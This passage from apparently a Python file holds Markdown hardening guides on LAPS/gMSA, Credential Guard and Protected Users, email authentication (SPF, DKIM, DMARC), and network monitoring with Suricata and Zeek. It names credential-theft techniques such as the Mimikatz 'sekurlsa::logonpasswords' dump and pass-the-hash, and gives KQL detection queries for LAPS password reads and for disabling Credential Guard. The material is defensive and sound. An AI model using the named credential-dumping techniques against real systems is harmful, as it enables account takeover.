```
Computer Configuration > Policies > Administrative Templates >
  System > LAPS

Settings:
  Configure password backup directory = Enabled (Active Directory)
  Password Settings:
    Password Complexity = Large letters + small letters + numbers + specials
    Password Length = 20
    Password Age (Days) = 30
  Name of administrator account to manage = (leave blank for built-in)
  Do not allow password expiration time longer than required = Enabled
  Configure authorized password decryptors = CONTOSO\Tier2-WorkstationAdmins
```

### Step 3: Grant Read Permissions

```powershell
# Allow Tier 2 admins to read workstation LAPS passwords
Set-LapsADReadPasswordPermission `
    -Identity "OU=Workstations,DC=contoso,DC=com" `
    -AllowedPrincipals "CONTOSO\Tier2-WorkstationAdmins"

# Allow Tier 1 admins to read server LAPS passwords
Set-LapsADReadPasswordPermission `
    -Identity "OU=Servers,DC=contoso,DC=com" `
    -AllowedPrincipals "CONTOSO\Tier1-ServerAdmins"

# Verify permissions
Find-LapsADExtendedRights -Identity "OU=Workstations,DC=contoso,DC=com"
```

### Step 4: Retrieve and Use LAPS Passwords

```powershell
# Retrieve password for a specific computer
Get-LapsADPassword -Identity "WORKSTATION01" -AsPlainText

# Output:
# ComputerName : WORKSTATION01
# Password     : x7#kQ9!mP2$wR5tY8&jL
# ExpirationTimestamp : 3/15/2026 10:30:00 AM

# Force immediate password rotation
Reset-LapsPassword -Identity "WORKSTATION01"
```

## Implementation: Group Managed Service Accounts (gMSA)

### Step 1: Create KDS Root Key

```powershell
# For production (takes up to 10 hours to replicate)
Add-KdsRootKey -EffectiveImmediately
# Note: "EffectiveImmediately" still has a 10-hour wait for DC replication

# For lab/testing only (immediate availability)
Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))
```

### Step 2: Create gMSA Accounts

```powershell
# Create a gMSA for SQL Server service
New-ADServiceAccount -Name "gMSA-SQLSvc" `
    -DNSHostName "gmsa-sqlsvc.contoso.com" `
    -PrincipalsAllowedToRetrieveManagedPassword "SQL-Servers" `
    -KerberosEncryptionType AES128,AES256 `
    -Description "gMSA for SQL Server service on all SQL hosts"

# Create a gMSA for IIS application pool
New-ADServiceAccount -Name "gMSA-WebApp" `
    -DNSHostName "gmsa-webapp.contoso.com" `
    -PrincipalsAllowedToRetrieveManagedPassword "Web-Servers" `
    -KerberosEncryptionType AES128,AES256

# Create a gMSA for scheduled tasks
New-ADServiceAccount -Name "gMSA-Tasks" `
    -DNSHostName "gmsa-tasks.contoso.com" `
    -PrincipalsAllowedToRetrieveManagedPassword "Task-Servers" `
    -KerberosEncryptionType AES128,AES256
```

### Step 3: Install gMSA on Target Servers

```powershell
# On each server that will use the gMSA
Install-ADServiceAccount -Identity "gMSA-SQLSvc"

# Verify the account works
Test-ADServiceAccount -Identity "gMSA-SQLSvc"
# Should return True
```

### Step 4: Configure Services to Use gMSA

```powershell
# Set SQL Server service to use gMSA
# Format: DOMAIN\AccountName$ (note the trailing $)
$credential = "CONTOSO\gMSA-SQLSvc$"

# For Windows services
Set-Service -Name "MSSQLSERVER" -ServiceAccountName "CONTOSO\gMSA-SQLSvc$"

# For IIS Application Pools (via appcmd)
# appcmd set config /section:applicationPools
#   /[name='MyAppPool'].processModel.identityType:SpecificUser
#   /[name='MyAppPool'].processModel.userName:CONTOSO\gMSA-WebApp$

# For Scheduled Tasks
$action = New-ScheduledTaskAction -Execute "PowerShell.exe" `
    -Argument "-File C:\Scripts\maintenance.ps1"
$trigger = New-ScheduledTaskTrigger -Daily -At "02:00"
$principal = New-ScheduledTaskPrincipal -UserId "CONTOSO\gMSA-Tasks$" `
    -LogonType Password
Register-ScheduledTask -TaskName "DailyMaintenance" `
    -Action $action -Trigger $trigger -Principal $principal
```

## Verification Commands

```powershell
# === LAPS Verification ===
# Check LAPS GPO is applied
gpresult /r | Select-String -Pattern "LAPS"

# Verify password was set
Get-LapsADPassword -Identity $env:COMPUTERNAME -AsPlainText

# Check LAPS schema attributes
Get-ADComputer "WORKSTATION01" -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

# === gMSA Verification ===
# List all gMSAs
Get-ADServiceAccount -Filter * | Select-Object Name, Enabled, PasswordLastSet

# Test gMSA on current server
Test-ADServiceAccount -Identity "gMSA-SQLSvc"

# Check which hosts can retrieve the gMSA password
Get-ADServiceAccount "gMSA-SQLSvc" -Properties PrincipalsAllowedToRetrieveManagedPassword |
    Select-Object -ExpandProperty PrincipalsAllowedToRetrieveManagedPassword
```

## Monitoring for Bypass

**LAPS monitoring:**

| Event | Detection |
|---|---|
| LAPS password read by unauthorized user | Audit AD object access on ms-Mcs-AdmPwd |
| LAPS GPO not applying | Monitor for machines with expired passwords |
| Local admin password changed manually | Event ID 4724 from non-LAPS source |

**gMSA monitoring:**

| Event | Detection |
|---|---|
| gMSA password retrieval | Event ID 4662 on gMSA object |
| Kerberoasting attempt on gMSA | Event ID 4769 with encryption type 0x17 |
| Unauthorized host retrieval | Monitor PrincipalsAllowedToRetrieve changes |

**Audit query for LAPS password reads:**

```kql
SecurityEvent
| where EventID == 4662
| where ObjectName has "ms-Mcs-AdmPwd"
| project TimeGenerated, Account, ObjectName, Computer
| where Account !in ("expected_admin_accounts")
```

## MITRE ATT&CK References

| Technique | ID | Mitigation |
|---|---|---|
| OS Credential Dumping | T1003 | Unique passwords limit lateral movement |
| Brute Force | T1110 | 240-char gMSA passwords infeasible to brute force |
| Kerberoasting | T1558.003 | gMSA uses AES, auto-rotates; less Kerberoastable |
| Pass the Hash | T1550.002 | LAPS hash only valid on one machine |
| Account Manipulation | T1098 | gMSA managed by AD, not humans |

## Rollout Checklist

- [ ] Update AD schema for LAPS
- [ ] Create KDS root key for gMSA (allow 10hr replication)
- [ ] Deploy LAPS GPO to pilot workstation OU
- [ ] Verify LAPS password generation and retrieval
- [ ] Expand LAPS to all workstations and servers
- [ ] Inventory existing service accounts for gMSA migration
- [ ] Create gMSA accounts with proper host group permissions
- [ ] Migrate services to gMSA in dev/test first
- [ ] Disable old service account passwords post-migration
- [ ] Configure SIEM alerting for LAPS and gMSA events
"""
    ))

    # -------------------------------------------------------------------------
    # Article 5: Windows Credential Guard and Protected Users
    # -------------------------------------------------------------------------
    articles.append((
        "Windows Credential Guard and Protected Users",
        ["hardening", "credential-guard", "windows", "defense", "identity", "credential-theft"],
        r"""# Windows Credential Guard and Protected Users

## Why This Matters

Windows stores credential material in the LSASS (Local Security Authority Subsystem Service) process memory. Tools like Mimikatz can dump this memory to extract NTLM hashes, Kerberos tickets, and plaintext passwords. **Credential Guard** uses virtualization-based security (VBS) to isolate LSASS secrets in a protected container that even kernel-level malware cannot access. **Protected Users** is an AD security group that enforces additional credential protections server-side.

Together, these technologies block the most common credential theft techniques used in post-exploitation:

| Attack Technique | Without Protection | With Credential Guard + Protected Users |
|---|---|---|
| Mimikatz sekurlsa::logonpasswords | Dumps plaintext passwords | Empty results or access denied |
| Pass-the-Hash (NTLM) | Works freely | NTLM authentication blocked |
| Pass-the-Ticket (Kerberos) | TGTs extractable from memory | TGTs isolated in VBS container |
| Kerberos delegation abuse | Credentials delegated | Delegation blocked for Protected Users |
| CredSSP credential caching | Credentials cached long-term | Short TGT lifetime (4 hours) |

## Prerequisites

- **Credential Guard**: Windows 10/11 Enterprise or Education, UEFI Secure Boot, TPM 2.0, Hyper-V support
- **Protected Users**: Domain functional level Windows Server 2012 R2 or higher
- Incompatible with: NTLMv1, unconstrained delegation, DES/RC4 Kerberos, Digest authentication

## Implementation: Credential Guard

### Step 1: Verify Hardware Support

```powershell
# Check if VBS is supported
$dg = Get-CimInstance -ClassName Win32_DeviceGuard `
    -Namespace root\Microsoft\Windows\DeviceGuard
$dg | Select-Object AvailableSecurityProperties,
    VirtualizationBasedSecurityStatus,
    SecurityServicesRunning

# Expected output for supported hardware:
# AvailableSecurityProperties: {1, 2, 3} (Secure Boot, DMA, UEFI)
# VirtualizationBasedSecurityStatus: 2 (Running)
# SecurityServicesRunning: {1, 2} (Credential Guard, HVCI)

# Check TPM
Get-Tpm | Select-Object TpmPresent, TpmReady, TpmEnabled
```

### Step 2: Enable via Group Policy

```
Computer Configuration > Administrative Templates > System > Device Guard

Turn On Virtualization Based Security = Enabled
  Select Platform Security Level: Secure Boot and DMA Protection
  Credential Guard Configuration: Enabled with UEFI lock
  Secure Launch Configuration: Enabled
```

**Via Registry (alternative):**

```powershell
# Enable VBS
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v RequirePlatformSecurityFeatures /t REG_DWORD /d 3 /f

# Enable Credential Guard
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f

# Enable Secure Launch (DRTM)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v ConfigureSystemGuardLaunch /t REG_DWORD /d 1 /f
```

### Step 3: Enable HVCI (Hypervisor-Protected Code Integrity)

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v Enabled /t REG_DWORD /d 1 /f
```

### Step 4: Reboot and Verify

```powershell
# After reboot, verify Credential Guard is running
(Get-CimInstance -ClassName Win32_DeviceGuard `
    -Namespace root\Microsoft\Windows\DeviceGuard).SecurityServicesRunning
# Should include value 1 (Credential Guard)

# Also visible in System Information (msinfo32)
# Look for: "Credential Guard" under Virtualization-based security Services Running
```

## Implementation: Protected Users Group

### Step 1: Understand the Restrictions

Adding an account to the Protected Users group enforces:

| Restriction | Effect |
|---|---|
| No NTLM authentication | Account cannot use NTLM, only Kerberos |
| No DES or RC4 in Kerberos pre-auth | Only AES encryption |
| No unconstrained delegation | Cannot delegate credentials |
| No renewable TGTs | TGT valid for 4 hours only |
| No credential caching | No offline logon with cached creds |
| No CredSSP delegation | Plaintext creds not sent via CredSSP |

### Step 2: Test with Pilot Accounts

```powershell
# Create a test admin account and add to Protected Users
Add-ADGroupMember -Identity "Protected Users" -Members "test-admin"

# Test authentication scenarios:
# 1. Kerberos logon to domain-joined machine - should work
# 2. NTLM auth to non-domain resource - should fail
# 3. RDP with CredSSP - should fail unless NLA + Kerberos configured
# 4. Offline logon - should fail (no cached credentials)
```

### Step 3: Add Tiered Admin Accounts

```powershell
# Add Tier 0 admin accounts (highest priority)
$t0Admins = Get-ADGroupMember "Tier0-Admins" |
    Select-Object -ExpandProperty SamAccountName
foreach ($admin in $t0Admins) {
    Add-ADGroupMember -Identity "Protected Users" -Members $admin
}

# Add Tier 1 admin accounts
$t1Admins = Get-ADGroupMember "Tier1-ServerAdmins" |
    Select-Object -ExpandProperty SamAccountName
foreach ($admin in $t1Admins) {
    Add-ADGroupMember -Identity "Protected Users" -Members $admin
}
```

### Step 4: Configure Supporting Settings

```powershell
# Ensure Kerberos AES is enabled domain-wide
# GPO: Computer Configuration > Windows Settings > Security Settings >
#   Local Policies > Security Options
#   Network security: Configure encryption types allowed for Kerberos
#   Enable: AES128_HMAC_SHA1, AES256_HMAC_SHA1, Future encryption types

# Disable NTLM where possible (support Protected Users)
# GPO: Computer Configuration > Windows Settings > Security Settings >
#   Local Policies > Security Options
#   Network security: Restrict NTLM: NTLM authentication in this domain = Deny all

# Configure NLA for RDP to work with Protected Users
# GPO: Computer Configuration > Administrative Templates >
#   Windows Components > Remote Desktop Services >
#   Remote Desktop Session Host > Security
#   Require user authentication for remote connections by using NLA = Enabled
```

## Verification Commands

```powershell
# Verify Credential Guard status
Get-ComputerInfo | Select-Object DeviceGuard*

# Check VBS status in detail
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Format-List *

# List Protected Users members
Get-ADGroupMember "Protected Users" | Select-Object Name, SamAccountName, ObjectClass

# Test NTLM is blocked for Protected Users
# From a machine, try: net use \\server\share /user:protecteduser
# Should fail with "Access is denied" if server requires NTLM

# Check Kerberos ticket details
klist

# Verify TGT renewal settings (should show 4-hour max for Protected Users)
klist tgt
```

## Monitoring for Bypass

**Key events to monitor:**

| Event ID | Log | Meaning |
|---|---|---|
| 4768 | Security | TGT request - check encryption type |
| 4776 | Security | NTLM auth attempt - should not occur for Protected Users |
| 8004 | LSA | NTLM blocked, fallback attempted |
| 6400 | Credential Guard | BrokerCryptoOperation |

**Detection query for NTLM attempts by Protected Users:**

```kql
SecurityEvent
| where EventID == 4776
| where TargetAccount in ("t0-admin1", "t0-admin2")
| project TimeGenerated, TargetAccount, Workstation, Status
```

**Credential Guard disable detection:**

```kql
DeviceRegistryEvents
| where RegistryKey has @"Control\Lsa" and RegistryValueName == "LsaCfgFlags"
| where RegistryValueData == "0"
| project Timestamp, DeviceName, InitiatingProcessAccountName
```

## MITRE ATT&CK References

| Technique | ID | Protection |
|---|---|---|
| OS Credential Dumping: LSASS Memory | T1003.001 | Credential Guard isolates LSASS secrets |
| Pass the Hash | T1550.002 | Protected Users blocks NTLM |
| Pass the Ticket | T1550.003 | Credential Guard protects TGTs; 4h expiry |
| Forced Authentication | T1187 | Protected Users blocks NTLM relay |
| Steal or Forge Kerberos Tickets | T1558 | AES-only, short-lived TGTs |

## Rollout Checklist

- [ ] Audit hardware compatibility (TPM 2.0, Secure Boot, Hyper-V)
- [ ] Deploy Credential Guard in audit mode first
- [ ] Enable UEFI lock only after confirming stability
- [ ] Identify applications requiring NTLM (compatibility check)
- [ ] Add test admin accounts to Protected Users
- [ ] Validate RDP, PowerShell remoting, and service accounts still work
- [ ] Add all Tier 0 accounts to Protected Users
- [ ] Add Tier 1 accounts to Protected Users
- [ ] Monitor for NTLM fallback failures
- [ ] Document exceptions and remediation plan for NTLM-dependent apps
"""
    ))

    # -------------------------------------------------------------------------
    # Article 6: Email Security Stack SPF DKIM DMARC and Gateway Config
    # -------------------------------------------------------------------------
    articles.append((
        "Email Security Stack SPF DKIM DMARC and Gateway Config",
        ["email-security", "spf", "dkim", "dmarc", "phishing", "defense", "hardening"],
        r"""# Email Security Stack: SPF, DKIM, DMARC, and Gateway Configuration

## Why This Matters

Email remains the primary initial access vector for most threat actors. Phishing, business email compromise (BEC), and malware delivery via email account for over 90% of successful breaches. A properly configured email security stack combining SPF, DKIM, and DMARC prevents domain spoofing, validates message integrity, and provides visibility into unauthorized use of your domain. Without these controls, any attacker can send emails that appear to come from your domain.

**Email authentication layers:**

| Layer | What It Does | DNS Record Type |
|---|---|---|
| SPF | Specifies which mail servers can send for your domain | TXT |
| DKIM | Cryptographically signs email headers and body | TXT (public key) |
| DMARC | Policy for handling SPF/DKIM failures + reporting | TXT |

**Cost of not implementing:**

- Attackers can spoof your domain for phishing campaigns
- No visibility into who is sending as your domain
- Email deliverability issues (major providers penalize unauthenticated mail)
- BEC attacks succeed when recipients trust the From address

## Implementation Steps

### Step 1: SPF (Sender Policy Framework)

SPF defines which IP addresses and mail servers are authorized to send email for your domain.

```dns
; Basic SPF record - publish as TXT record on domain root
; v=spf1 defines the version
; include: authorizes third-party senders
; ip4: authorizes specific IP ranges
; -all: hard fail - reject all others

; Example for Microsoft 365 + on-premise relay
contoso.com. IN TXT "v=spf1 include:spf.protection.outlook.com ip4:203.0.113.0/24 -all"

; Example for Google Workspace + Mailchimp + SendGrid
example.com. IN TXT "v=spf1 include:_spf.google.com include:servers.mcsv.net include:sendgrid.net -all"
```

**SPF mechanism reference:**

| Mechanism | Meaning |
|---|---|
| `include:domain` | Check domain's SPF record too |
| `ip4:x.x.x.x/cidr` | Authorize IPv4 range |
| `ip6:xxxx::/cidr` | Authorize IPv6 range |
| `a` | Authorize domain's A record IPs |
| `mx` | Authorize domain's MX record IPs |
| `~all` | Soft fail (mark but deliver) |
| `-all` | Hard fail (reject) |

**Common pitfalls:**
- SPF has a 10-DNS-lookup limit. Exceeding this causes `permerror`
- Flatten includes to reduce lookups: use `ip4:` instead of nested `include:`
- Subdomain SPF: each subdomain needs its own SPF or inherits none

### Step 2: DKIM (DomainKeys Identified Mail)

DKIM adds a cryptographic signature to outgoing mail headers.

**Generate DKIM keys (example with OpenSSL):**

```bash
# Generate 2048-bit RSA key pair
openssl genrsa -out dkim-private.pem 2048
openssl rsa -in dkim-private.pem -pubout -out dkim-public.pem

# Extract public key for DNS (remove headers, join lines)
grep -v "PUBLIC KEY" dkim-public.pem | tr -d '\n'
```

**DNS record for DKIM:**

```dns
; Selector "s1" for contoso.com
s1._domainkey.contoso.com. IN TXT "v=DKIM1; k=rsa; p=MIIBIjANBgkqhki...longpublickey..."

; For Microsoft 365 (uses CNAME to Microsoft's key management)
selector1._domainkey.contoso.com. IN CNAME selector1-contoso-com._domainkey.contoso.onmicrosoft.com.
selector2._domainkey.contoso.com. IN CNAME selector2-contoso-com._domainkey.contoso.onmicrosoft.com.
```

**Enable DKIM in Microsoft 365:**

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Enable DKIM signing
New-DkimSigningConfig -DomainName "contoso.com" -Enabled $true

# Verify status
Get-DkimSigningConfig -Identity "contoso.com" | Format-List Domain, Enabled, Status
```

### Step 3: DMARC (Domain-based Message Authentication, Reporting, and Conformance)

DMARC ties SPF and DKIM together with a policy and reporting mechanism.

**Phased DMARC deployment:**

```dns
; Phase 1: Monitor only (p=none) - collect reports for 4-6 weeks
_dmarc.contoso.com. IN TXT "v=DMARC1; p=none; rua=mailto:dmarc-reports@contoso.com; ruf=mailto:dmarc-forensics@contoso.com; fo=1"

; Phase 2: Quarantine with percentage (start at 10%)
_dmarc.contoso.com. IN TXT "v=DMARC1; p=quarantine; pct=10; rua=mailto:dmarc-reports@contoso.com; ruf=mailto:dmarc-forensics@contoso.com; fo=1"

; Phase 3: Quarantine 100%
_dmarc.contoso.com. IN TXT "v=DMARC1; p=quarantine; pct=100; rua=mailto:dmarc-reports@contoso.com; fo=1"

; Phase 4: Reject (full protection)
_dmarc.contoso.com. IN TXT "v=DMARC1; p=reject; rua=mailto:dmarc-reports@contoso.com; fo=1"
```

**DMARC tag reference:**

| Tag | Meaning | Values |
|---|---|---|
| `p` | Policy for domain | none, quarantine, reject |
| `sp` | Policy for subdomains | none, quarantine, reject |
| `rua` | Aggregate report URI | mailto: address |
| `ruf` | Forensic report URI | mailto: address |
| `pct` | Percentage to apply policy | 0-100 |
| `fo` | Failure reporting options | 0, 1, d, s |
| `adkim` | DKIM alignment mode | r (relaxed), s (strict) |
| `aspf` | SPF alignment mode | r (relaxed), s (strict) |

### Step 4: Email Gateway Hardening

**Microsoft 365 Defender / Exchange Online Protection:**

```powershell
# Create anti-phishing policy
New-AntiPhishPolicy -Name "Strict Anti-Phish" `
    -EnableMailboxIntelligenceProtection $true `
    -EnableOrganizationDomainsProtection $true `
    -EnableSpoofIntelligence $true `
    -PhishThresholdLevel 3 `
    -EnableFirstContactSafetyTips $true

# Create Safe Attachments policy
New-SafeAttachmentPolicy -Name "Strict Safe Attachments" `
    -Action Block `
    -Enable $true `
    -ActionOnError $true

# Create Safe Links policy
New-SafeLinksPolicy -Name "Strict Safe Links" `
    -IsEnabled $true `
    -ScanUrls $true `
    -EnableForInternalSenders $true `
    -DeliverMessageAfterScan $true `
    -DisableUrlRewrite $false

# Block common malicious attachment types
New-TransportRule -Name "Block Dangerous Attachments" `
    -AttachmentExtensionMatchesWords @("exe","vbs","js","wsf","hta","bat","cmd","ps1","scr","pif") `
    -RejectMessageReasonText "Blocked attachment type" `
    -StopRuleProcessing $true
```

## Verification Commands

```bash
# Check SPF record
nslookup -type=txt contoso.com
dig TXT contoso.com +short

# Check DKIM record
nslookup -type=txt s1._domainkey.contoso.com
dig TXT selector1._domainkey.contoso.com +short

# Check DMARC record
nslookup -type=txt _dmarc.contoso.com
dig TXT _dmarc.contoso.com +short

# Test email authentication (send test email)
# Use: https://www.mail-tester.com/
# Or: check headers of received email for Authentication-Results
```

```powershell
# PowerShell verification
Resolve-DnsName -Name "contoso.com" -Type TXT | Where-Object { $_.Strings -match "spf" }
Resolve-DnsName -Name "_dmarc.contoso.com" -Type TXT
Resolve-DnsName -Name "selector1._domainkey.contoso.com" -Type CNAME
```

## Monitoring for Bypass

**DMARC aggregate reports** arrive daily in XML format. Parse them to identify:

- Unauthorized senders using your domain
- SPF/DKIM alignment failures from legitimate services
- Spoofing campaigns targeting your domain

**Key metrics to track:**

| Metric | Alert Threshold |
|---|---|
| DMARC fail rate | > 5% of total volume |
| Unknown sending IPs | Any new IP not in SPF |
| Spoofed From: header | Any reject/quarantine action |
| DKIM signature failures | > 1% of signed messages |

**SIEM query for inbound spoofing attempts:**

```kql
EmailEvents
| where AuthenticationDetails has "dmarc=fail"
| where SenderFromDomain == "contoso.com"
| summarize Count=count() by SenderFromAddress, SenderIPv4, Subject
| sort by Count desc
```

## MITRE ATT&CK References

| Technique | ID | Protection |
|---|---|---|
| Phishing: Spearphishing Attachment | T1566.001 | Gateway attachment filtering |
| Phishing: Spearphishing Link | T1566.002 | Safe Links URL scanning |
| Phishing: Spearphishing via Service | T1566.003 | DMARC prevents domain spoofing |
| Impersonation | T1656 | Anti-phish impersonation detection |
| Domain spoofing for C2 | T1583.001 | SPF/DKIM/DMARC block spoofed replies |

## Rollout Checklist

- [ ] Inventory all legitimate email senders (marketing, ticketing, CRM, etc.)
- [ ] Publish SPF record with all authorized senders
- [ ] Configure and enable DKIM signing
- [ ] Deploy DMARC in `p=none` mode with reporting
- [ ] Analyze DMARC reports for 4-6 weeks
- [ ] Add missing legitimate senders to SPF
- [ ] Gradually increase DMARC policy to quarantine then reject
- [ ] Configure email gateway anti-phishing policies
- [ ] Block dangerous attachment types via transport rules
- [ ] Set up ongoing DMARC report monitoring
"""
    ))

    # -------------------------------------------------------------------------
    # Article 7: Network Monitoring Architecture for Detection
    # -------------------------------------------------------------------------
    articles.append((
        "Network Monitoring Architecture for Detection",
        ["network", "monitoring", "detection", "ndr", "ids", "defense", "architecture"],
        r"""# Network Monitoring Architecture for Detection

## Why This Matters

Network-based detection provides visibility that endpoint agents cannot. Even with full EDR coverage, adversaries use techniques like living-off-the-land, encrypted C2 channels, and fileless attacks that may evade endpoint detection. Network monitoring catches lateral movement, data exfiltration, C2 beaconing, and protocol anomalies that are only visible on the wire. A well-architected network monitoring solution is a critical layer in defense-in-depth.

**Detection gaps without network monitoring:**

| Scenario | Endpoint Visibility | Network Visibility |
|---|---|---|
| C2 over DNS tunneling | Minimal | Full payload reconstruction |
| Lateral movement via SMB | Process execution logs | Connection patterns, share access |
| Data exfiltration to cloud storage | Browser history (maybe) | Volume, frequency, destination |
| Rogue DHCP/ARP spoofing | None | Immediate detection |
| Encrypted C2 beaconing | Certificate pinning blocks inspection | JA3/JA4 fingerprinting, timing analysis |
| IoT/OT device compromise | No agent possible | Full network visibility |

## Architecture Components

### Core Components

```
                    +------------------+
                    |   SIEM / SOAR    |
                    |  (Elasticsearch  |
                    |   / Sentinel)    |
                    +--------+---------+
                             |
              +--------------+--------------+
              |              |              |
     +--------+---+  +------+------+  +----+-------+
     | Network    |  | Full Packet |  | Netflow /  |
     | IDS/IPS    |  | Capture     |  | IPFIX      |
     | (Suricata) |  | (Arkime)    |  | Collector  |
     +--------+---+  +------+------+  +----+-------+
              |              |              |
              +--------------+--------------+
                             |
                    +--------+---------+
                    |   Network TAP    |
                    |   or SPAN Port   |
                    +--------+---------+
                             |
                    +--------+---------+
                    |  Core Switch /   |
                    |  Network Fabric  |
                    +------------------+
```

### Sensor Placement Strategy

| Location | What It Sees | Priority |
|---|---|---|
| Internet edge (behind firewall) | Inbound/outbound traffic, C2 | Critical |
| DMZ segment | Web server traffic, email flow | Critical |
| Core switch | East-west (lateral) traffic | High |
| Data center segment | Server-to-server communication | High |
| User VLAN trunk | Workstation traffic patterns | Medium |
| Cloud VPC mirror | Cloud workload traffic | Medium |
| OT/IoT segment | Industrial protocol anomalies | High (if applicable) |

## Implementation Steps

### Step 1: Network TAP / SPAN Configuration

**Cisco switch SPAN port configuration:**

```
! Mirror VLAN 10 (servers) and VLAN 20 (users) to monitoring port
monitor session 1 source vlan 10,20 both
monitor session 1 destination interface GigabitEthernet0/24
monitor session 1 filter packet-type good

! Verify SPAN session
show monitor session 1
```

**Network TAP (preferred over SPAN for production):**

```
Recommended: Gigamon, Keysight, or Garland passive copper/fiber TAPs
- Passive TAPs: No power needed, zero packet loss, fail-open
- Aggregation TAPs: Combine multiple links to one monitoring port
- Packet brokers: Filter, deduplicate, load-balance to sensors
```

### Step 2: Deploy Suricata IDS

```bash
# Install Suricata on Ubuntu sensor
sudo apt-get update
sudo apt-get install -y suricata suricata-update

# Configure interface for monitoring
sudo vim /etc/suricata/suricata.yaml
```

**Key suricata.yaml settings:**

```yaml
# Network interface configuration
af-packet:
  - interface: eth1          # TAP/SPAN interface
    cluster-id: 99
    cluster-type: cluster_flow
    defrag: yes
    use-mmap: yes
    ring-size: 200000
    buffer-size: 1048576

# Define HOME_NET (your internal ranges)
vars:
  address-groups:
    HOME_NET: "[10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16]"
    EXTERNAL_NET: "!$HOME_NET"
    DNS_SERVERS: "[10.1.1.53, 10.1.1.54]"

# Enable protocol detection
app-layer:
  protocols:
    tls:
      enabled: yes
      ja3-fingerprints: yes    # JA3 fingerprinting for encrypted traffic
      ja4-fingerprints: yes    # JA4+ next-gen fingerprinting
    dns:
      enabled: yes
    http:
      enabled: yes
    smb:
      enabled: yes
    dcerpc:
      enabled: yes
    krb5:
      enabled: yes

# EVE JSON output for SIEM ingestion
outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: /var/log/suricata/eve.json
      types:
        - alert
        - dns
        - tls
        - http
        - flow
        - netflow
        - smb
        - krb5
```

**Update and manage rule sets:**

```bash
# Update ET Open rules
sudo suricata-update

# Add ET Pro rules (if licensed)
sudo suricata-update enable-source et/pro

# Add Abuse.ch rules
sudo suricata-update enable-source oisf/trafficid
sudo suricata-update enable-source abuse.ch/sslbl

# Reload rules without restart
sudo suricatasc -c reload-rules
```

### Step 3: Deploy Zeek (Network Analysis Framework)

```bash
# Install Zeek and configure monitored interface
sudo apt-get install -y zeek
# /etc/zeek/node.cfg: set worker interface=eth1, lb_method=pf_ring, lb_procs=4

# /etc/zeek/local.zeek - enable key analysis scripts
@load protocols/conn/known-hosts
@load protocols/conn/known-services
@load protocols/dns/detect-external-names
@load protocols/ssl/validate-certs
@load protocols/ssh/detect-bruteforcing
@load frameworks/files/hash-all-files
@load policy/tuning/json-logs     # JSON output for SIEM
```

### Step 4: NetFlow / IPFIX Collection

```bash
# Install nfdump and start collector
sudo apt-get install -y nfdump
nfcapd -w -D -l /var/cache/nfdump -p 9995 -T all
```

**Cisco router NetFlow v9 export:**

```
ip flow-export version 9
ip flow-export destination 10.1.1.100 9995
ip flow-export source Loopback0
interface GigabitEthernet0/0
 ip flow ingress
 ip flow egress
```

### Step 5: SIEM Integration

```yaml
# Filebeat configuration for Suricata + Zeek -> Elasticsearch
filebeat.inputs:
  - type: log
    enabled: true
    paths:
      - /var/log/suricata/eve.json
    json.keys_under_root: true
    fields:
      source: suricata

  - type: log
    enabled: true
    paths:
      - /opt/zeek/logs/current/*.log
    json.keys_under_root: true
    fields:
      source: zeek

output.elasticsearch:
  hosts: ["https://siem.contoso.com:9200"]
  protocol: "https"
  username: "filebeat_writer"
  password: "${ES_PASSWORD}"
  index: "network-monitor-%{+yyyy.MM.dd}"
```

## Verification Commands

```bash
# Verify Suricata is capturing traffic
sudo suricatasc -c uptime
sudo suricatasc -c iface-stat eth1
tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'

# Verify Zeek is running
sudo zeekctl status
ls -la /opt/zeek/logs/current/

# Check NetFlow collection
nfdump -R /var/cache/nfdump -s srcip/flows | head -20

# Test detection with known bad traffic
curl http://testmynids.org/uid/index.html  # Should trigger ET rule
```

## Monitoring for Bypass

**Evasion techniques to watch for:**

| Evasion | Detection |
|---|---|
| Encrypted C2 (HTTPS) | JA3/JA4 fingerprinting, certificate anomalies |
| DNS tunneling | Query length > 50 chars, high NXDOMAIN rate |
| Protocol tunneling (DNS over HTTPS) | Block DoH endpoints, monitor port 443 to known DoH IPs |
| Fragmentation attacks | Reassembly in Suricata, defrag: yes |
| Traffic on non-standard ports | Protocol detection vs port-based rules |

## MITRE ATT&CK References

| Technique | ID | Detection |
|---|---|---|
| Application Layer Protocol | T1071 | Deep packet inspection, protocol analysis |
| Encrypted Channel | T1573 | JA3/JA4, certificate analysis |
| Proxy: External Proxy | T1090.002 | Anomalous destination patterns |
| Exfiltration Over C2 Channel | T1041 | Volume analysis, beaconing detection |
| Protocol Tunneling | T1572 | DNS query analysis, tunnel detection |
| Lateral Tool Transfer | T1570 | SMB file transfer monitoring |

## Rollout Checklist

- [ ] Map network topology and identify TAP/SPAN placement points
- [ ] Deploy network TAPs at internet edge and core
- [ ] Install and configure Suricata with ET Open/Pro rules
- [ ] Install and configure Zeek for protocol analysis
- [ ] Set up NetFlow/IPFIX collection from network devices
- [ ] Configure SIEM ingestion pipeline
- [ ] Tune rules to reduce false positives (2-4 week period)
- [ ] Create detection dashboards for C2, lateral movement, exfiltration
- [ ] Establish baseline traffic patterns for anomaly detection
- [ ] Schedule weekly rule updates and quarterly architecture review
"""
    ))

    # -------------------------------------------------------------------------
    # Article 8: Honeypots and Deception with CanaryTokens and OpenCanary
    # -------------------------------------------------------------------------
    articles.append((
        "Honeypots and Deception with CanaryTokens and OpenCanary",
        ["deception", "honeypot", "canary", "detection", "defense", "active-defense"],
        r"""# Honeypots and Deception with CanaryTokens and OpenCanary

## Why This Matters

